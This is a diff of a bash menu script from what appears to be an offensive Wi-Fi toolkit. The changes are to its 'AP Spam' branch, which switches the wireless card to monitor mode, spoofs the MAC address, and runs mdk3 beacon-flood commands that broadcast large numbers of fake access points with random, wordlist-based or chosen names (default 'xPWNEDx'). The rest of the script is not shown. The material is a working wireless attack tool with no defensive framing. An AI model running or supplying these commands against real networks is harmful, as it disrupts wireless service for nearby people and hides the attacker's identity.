@@ -14,20 +14,20 @@ if [[ "$SO" == "1" ]]; then   # Wifi Cracking
 elif [[ "$SO" == "2" ]]; then # AP Spam
   selectOptions "AP Spam" "Selection" "Try another selection" "Random Network Names" "Network Names from Worldist" "Specific Network Names"
   if [[ "$SO" == "1" ]]; then   # Random
-    getInput "Number of APs" "Enter the number of Access Points to generate." "1000"
+    # getInput "Number of APs" "Enter the number of Access Points to generate." "1000"
     changeWImode monitor
     changeMac
-    mdk3 $AD b -f ./random_wordlist.txt -a -s $N
+    mdk3 $WI b -f ./random_wordlist.txt -a # -s $N
   elif [[ "$SO" == "2" ]]; then # Wordlist
     getInput "Wordlist File" "Enter Wordlist Path." "/root/desktop/wordlist.txt"
     changeWImode monitor
     changeMac
-    mdk3 $AD b -f "$SI" -a -s $(wc -l "$SI" | cut -f1 -d ' ')
+    mdk3 $WI b -f "$SI" -a -s $(wc -l "$SI" | cut -f1 -d ' ')
   elif [[ "$SO" == "3" ]]; then # Specific
     getInput "Network Name" "Type a string" "xPWNEDx"
     string=$SI
     getInput "Number of APs" "Enter the number of Access Points to generate." "1000"
     N=$SI
-    mdk3 $AD b -n "$string" -a
+    mdk3 $WI b -n "$string" -a
   fi
 fi
